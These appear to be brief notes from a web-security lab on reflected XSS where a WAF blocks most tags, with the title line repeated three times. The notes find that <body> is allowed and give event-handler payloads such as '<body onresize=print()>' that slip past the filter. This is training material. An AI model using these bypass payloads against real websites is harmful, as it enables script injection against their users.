# Lab: Reflected XSS into HTML context with most tags and attributes blockedLab: Reflected XSS into HTML context with most tags and attributes blockedLab: Reflected XSS into HTML context with most tags and attributes blocked

Task: bypasses the WAF and calls the print() function.

    <> allowed tag
    
    <body> - allowed 
    
```html 
    <body =1></body> OK 
    ```

```html
   <body onbeforeinput=print()> OR <body onresize=print()>
   ```
